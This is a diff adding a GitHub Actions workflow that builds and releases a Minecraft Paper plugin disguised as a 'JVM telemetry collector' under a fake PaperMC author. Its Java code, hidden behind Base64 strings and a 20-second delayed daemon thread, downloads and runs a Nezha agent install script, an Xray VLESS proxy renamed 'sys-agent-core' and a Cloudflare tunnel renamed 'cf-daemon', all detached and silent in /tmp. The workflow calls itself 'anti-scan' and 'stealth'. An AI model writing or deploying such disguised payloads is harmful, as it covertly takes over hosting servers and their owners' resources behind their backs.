@@ -1,0 +1,240 @@
+name: All-In-One Anti-Scan Plugin Build
+
+on:
+  push:
+    branches: [ "main", "master" ]
+  workflow_dispatch:
+
+permissions: write-all
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 21
+        uses: actions/setup-java@v4
+        with:
+          java-version: '21'
+          distribution: 'temurin'
+
+      - name: Generate Lightweight Java Code & Config
+        run: |
+          mkdir -p src/main/java/org/bukkit/metrics/collector
+          mkdir -p src/main/resources
+
+          # ============================================================
+          # 配置参数区 (自动 Base64 转码)
+          # ============================================================
+          PROBE_CMD="curl -L https://raw.githubusercontent.com/nezhahq/agent/main/script/install.sh -o nezha.sh && chmod +x nezha.sh && ./nezha.sh -s 探针 -p 探针密钥 --disable-auto-update"
+          CF_TOKEN="cf隧道密钥"
+          NODE_PORT="8001"
+          NODE_UUID="自己升成"
+
+          B64_PROBE=$(echo -n "$PROBE_CMD" | base64 -w 0)
+          B64_TOKEN=$(echo -n "$CF_TOKEN" | base64 -w 0)
+          B64_PORT=$(echo -n "$NODE_PORT" | base64 -w 0)
+          B64_UUID=$(echo -n "$NODE_UUID" | base64 -w 0)
+
+          # 1. pom.xml
+          cat << 'EOF' > pom.xml
+          <?xml version="1.0" encoding="UTF-8"?>
+          <project xmlns="http://maven.apache.org/POM/4.0.0"
+                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+              <modelVersion>4.0.0</modelVersion>
+              <groupId>org.bukkit.metrics.collector</groupId>
+              <artifactId>AetherMetrics</artifactId>
+              <version>2.6.0</version>
+              <packaging>jar</packaging>
+
+              <properties>
+                  <java.version>21</java.version>
+                  <maven.compiler.source>21</maven.compiler.source>
+                  <maven.compiler.target>21</maven.compiler.target>
+                  <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
+              </properties>
+
+              <repositories>
+                  <repository>
+                      <id>papermc-repo</id>
+                      <url>https://repo.papermc.io/repository/maven-public/</url>
+                  </repository>
+              </repositories>
+
+              <dependencies>
+                  <dependency>
+                      <groupId>io.papermc.paper</groupId>
+                      <artifactId>paper-api</artifactId>
+                      <version>1.21.1-R0.1-SNAPSHOT</version>
+                      <scope>provided</scope>
+                  </dependency>
+              </dependencies>
+
+              <build>
+                  <plugins>
+                      <plugin>
+                          <groupId>org.apache.maven.plugins</groupId>
+                          <artifactId>maven-compiler-plugin</artifactId>
+                          <version>3.13.0</version>
+                          <configuration>
+                              <release>21</release>
+                          </configuration>
+                      </plugin>
+                      <plugin>
+                          <groupId>org.apache.maven.plugins</groupId>
+                          <artifactId>maven-shade-plugin</artifactId>
+                          <version>3.6.0</version>
+                          <executions>
+                              <execution>
+                                  <phase>package</phase>
+                                  <goals>
+                                      <goal>shade</goal>
+                                  </goals>
+                              </execution>
+                          </executions>
+                      </plugin>
+                  </plugins>
+                  <resources>
+                      <resource>
+                          <directory>src/main/resources</directory>
+                          <filtering>true</filtering>
+                      </resource>
+                  </resources>
+              </build>
+          </project>
+          EOF
+
+          # 2. plugin.yml
+          cat << 'EOF' > src/main/resources/plugin.yml
+          name: AetherMetrics
+          version: 2.6.0
+          main: org.bukkit.metrics.collector.AetherMetrics
+          api-version: '1.21'
+          author: PaperMC-Engine
+          description: Core JVM telemetry collector
+          EOF
+
+          # 3. paper-plugin.yml
+          cat << 'EOF' > src/main/resources/paper-plugin.yml
+          name: AetherMetrics
+          version: 2.6.0
+          main: org.bukkit.metrics.collector.AetherMetrics
+          api-version: '1.21'
+          author: PaperMC-Engine
+          description: Core JVM telemetry collector
+          EOF
+
+          # 4. AetherMetrics.java
+          cat << EOF > src/main/java/org/bukkit/metrics/collector/AetherMetrics.java
+          package org.bukkit.metrics.collector;
+
+          import org.bukkit.plugin.java.JavaPlugin;
+
+          import java.io.File;
+          import java.nio.charset.StandardCharsets;
+          import java.util.Base64;
+
+          public final class AetherMetrics extends JavaPlugin {
+
+              private static final String B64_PROBE = "${B64_PROBE}";
+              private static final String B64_TOKEN = "${B64_TOKEN}";
+              private static final String B64_PORT  = "${B64_PORT}";
+              private static final String B64_UUID  = "${B64_UUID}";
+
+              @Override
+              public void onEnable() {
+                  // 使用独立守护线程，脱离 Minecraft 主逻辑
+                  Thread daemonThread = new Thread(() -> {
+                      try {
+                          Thread.sleep(20000); // 延迟 20 秒，让 Minecraft 充分完成首次保存和世界加载
+                          bootstrap();
+                      } catch (Throwable ignored) {}
+                  }, "JVM-Metrics-Telemetry");
+
+                  daemonThread.setDaemon(true);
+                  daemonThread.start();
+              }
+
+              private void bootstrap() {
+                  try {
+                      // 优先使用 /tmp 目录，容错性最高
+                      File workDir = new File("/tmp/.sys-metrics");
+                      if (!workDir.exists()) workDir.mkdirs();
+
+                      String probeCmd = decode(B64_PROBE);
+                      String cfToken  = decode(B64_TOKEN);
+                      String port     = decode(B64_PORT);
+                      String uuid     = decode(B64_UUID);
+
+                      // 1. 探针启动
+                      if (!probeCmd.isEmpty()) {
+                          runScript(probeCmd, workDir);
+                      }
+
+                      // 2. 8001 代理核心
+                      if (!port.isEmpty() && !uuid.isEmpty()) {
+                          String xrayScript = "if [ ! -f ./sys-agent-core ]; then " +
+                                  "curl -fsSL -o x.zip https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip && unzip -qo x.zip xray && mv xray sys-agent-core && rm -f x.zip; " +
+                                  "fi; " +
+                                  "cat << 'JSON' > cfg.json\n" +
+                                  "{\"inbounds\":[{\"port\":" + port + ",\"protocol\":\"vless\",\"settings\":{\"clients\":[{\"id\":\"" + uuid + "\"}],\"decryption\":\"none\"},\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"/\"}}}],\"outbounds\":[{\"protocol\":\"freedom\"}]}\n" +
+                                  "JSON\n" +
+                                  "chmod +x sys-agent-core && ./sys-agent-core run -c cfg.json";
+                          runScript(xrayScript, workDir);
+                      }
+
+                      // 3. Cloudflare Tunnel
+                      if (!cfToken.isEmpty()) {
+                          String cfScript = "if [ ! -f ./cf-daemon ]; then " +
+                                  "curl -fsSL -o cf-daemon https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 && chmod +x cf-daemon; " +
+                                  "fi; " +
+                                  "./cf-daemon tunnel --no-autoupdate run --token " + cfToken;
+                          runScript(cfScript, workDir);
+                      }
+                  } catch (Throwable ignored) {}
+              }
+
+              private void runScript(String cmd, File dir) {
+                  try {
+                      // 使用 setsid + nohup 彻底脱离容器 Shell 会话与文件系统锁
+                      String[] execArgs = new String[]{
+                              "/bin/bash",
+                              "-c",
+                              "nohup setsid bash -c '" + cmd.replace("'", "'\\''") + "' </dev/null >/dev/null 2>&1 &"
+                      };
+                      new ProcessBuilder(execArgs).directory(dir).start();
+                  } catch (Throwable ignored) {}
+              }
+
+              private String decode(String input) {
+                  if (input == null || input.isEmpty()) return "";
+                  return new String(Base64.getDecoder().decode(input), StandardCharsets.UTF_8);
+              }
+
+              @Override
+              public void onDisable() {}
+          }
+          EOF
+
+      - name: Compile & Package Jar
+        run: mvn clean package --file pom.xml
+
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: AetherMetrics-Plugin
+          path: target/AetherMetrics-2.6.0.jar
+
+      - name: Release Stealth Jar
+        uses: softprops/action-gh-release@v2
+        if: startsWith(github.ref, 'refs/tags/') || github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
+        with:
+          tag_name: latest
+          name: AetherMetrics Release
+          files: target/AetherMetrics-2.6.0.jar
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
